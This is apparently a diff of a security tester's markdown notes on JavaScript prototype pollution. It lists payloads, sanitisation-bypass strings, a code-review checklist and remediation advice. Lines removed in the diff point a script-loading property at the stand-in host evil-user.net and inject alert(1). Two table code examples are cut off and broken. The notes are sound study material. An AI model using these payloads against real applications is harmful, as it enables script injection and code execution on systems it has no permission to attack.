@@ -2,16 +2,24 @@
 
 Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.
 
-## Prototype Pollution Sources
-
-- The URL via query or fragment
-- JSON-based input
-- Web messages
-
+|**Component**|**Role**|**Common Examples**|**Code Example**|
+|---|---|---|---|
+|**Source**|**The Entry Point.**<br><br>  <br><br>Where untrusted input enters the application and is dangerously merged into an object.|• recursive merge functions<br><br>  <br><br>• URL query parsers (e.g., `qs`, `minimist`)<br><br>  <br><br>• JSON payload handlers|`merge(target, JSON.parse(userInput))`<br><br>  <br><br>_Input: `{"__proto__": {"debug": true}}`_|
+|**Gadget**|**The "Sleeper Agent."**<br><br>  <br><br>Legitimate code that looks for a property, finds it undefined, and falls back to the polluted prototype.|• Configuration loaders<br><br>  <br><br>• "Option" objects in libraries<br><br>  <br><br>• `if (config.isAdmin)` checks|`const shell = options.shell|
+|**Sink**|**The Execution Zone.**<br><br>  <br><br>The dangerous function where the gadget eventually feeds the polluted data to cause harm.|• **Client:** `innerHTML`, `document.write`<br><br>  <br><br>• **Server:** `child_process.spawn`, `eval`, `vm.runInNewContext`|`child_process.spawn(shell, ...)`<br><br>  <br><br>_Executes the polluted command, leading to RCE._|
+## Sources
 ### Via the URL
 
 ```
 test.com/?__proto__[foo]=bar
+```
+
+```
+?__proto__[polluted]=true
+```
+
+```
+?constructor[prototype][polluted]=true
 ```
 
 ### Via JSON
@@ -24,74 +32,14 @@ test.com/?__proto__[foo]=bar
 }
 ```
 
-## Prototype Pollution Sources
-
-A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.
-
-Largely trial and error
-
-## Prototype Pollution Gadgets
-
-A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:
-
-- Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
-    
-- Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
-
-### Examples
-
 ```
-vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
+{"__proto__": {"polluted": true}}
 ```
 
-```
-vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
-```
-
-## Testing for client-side prototype pollution sources
-
-- [ ] Try to inject an arbitrary property via the query string
+Bypass
 
 ```
-target.com/?__proto__[foo]=bar
-```
-
-- [ ] Check in the console if the the prototype has been polluted
-
-```
-Object.prototype.foo
-```
-
-- [ ] If that doesn't work, try a different method
-
-```
-target.com/?__proto__.foo=bar
-```
-
-- [ ] Try sending in JSON
-
-```
-"__proto__":{
-	"foo":"bar"
-}
-```
-
-### Alternatives
-
-- [ ] Try using the constructor
-
-```
-/?constructor.prototype.foo=bar
-```
-
-- [ ] Check for flawed key sanitization
-
-```
-/?__pro__proto__to__.foo=bar
-/?__pro__proto__to__[foo]=bar 
-/?__pro__proto__to__.foo=bar 
-/?constconstructorructor[protoprototypetype][foo]=bar 
-/?constconstructorructor.protoprototypetype.foo=bar
+{"constructor": {"prototype": {"polluted": true}}}
 ```
 
 ## Server-side prototype pollution
@@ -118,6 +66,33 @@ target.com/?__proto__.foo=bar
     ]
 }
 ```
+
+## Code review
+
+Look for
+
+- [ ] merge
+- [ ] extend
+- [ ] deepCopy
+- [ ] defaults
+
+Also check for assignment loops
+
+```
+target[key] = source[key]
+```
+
+
+- [ ] Check for flawed key sanitization
+
+```
+/?__pro__proto__to__.foo=bar
+/?__pro__proto__to__[foo]=bar 
+/?__pro__proto__to__.foo=bar 
+/?constconstructorructor[protoprototypetype][foo]=bar 
+/?constconstructorructor.protoprototypetype.foo=bar
+```
+
 ## Labs
 
 ### DOM XSS via client-side prototype pollution
@@ -166,3 +141,17 @@ Use the constructor instead of `__proto__`.
 
 ![](../attachments/prototype-pollution/image-6.png)
 
+## Remediation
+
+- [ ] Use a `MAP` instead of an `Object`.
+- [ ] Use the "Null" object. This creates objects that have no prototype
+- [ ] Freeze the prototype -- Makes the prototype read-only, but can break older libraries that modify the prototype internally. 
+- [ ] Input validation can be used, but can often be trivially bypassed. Last resort.
+
+| **Strategy**                    | **Recommendation**                                                                             | **Implementation Example**                   |
+| ------------------------------- | ---------------------------------------------------------------------------------------------- | -------------------------------------------- |
+| **1. Use Safe Data Structures** | **High Priority.** Use `Map` for key-value storage instead of plain objects.                   | `let cache = new Map();`                     |
+| **2. Null-Prototype Objects**   | **High Priority.** Create objects that do not inherit from `Object.prototype`.                 | `let obj = Object.create(null);`             |
+| **3. Schema Validation**        | **Medium Priority.** Use libraries like Joi or Ajv to strictly define allowed JSON structures. | Ensure schema does not allow arbitrary keys. |
+| **4. Input Sanitization**       | **Immediate Patch.** Block dangerous keys in merge functions.                                  | `if (key === '**proto**'                     |
+| **5. Object Freezing**          | **Defense in Depth.** Prevent any changes to the prototype. (Test thoroughly!)                 | `Object.freeze(Object.prototype);`           |
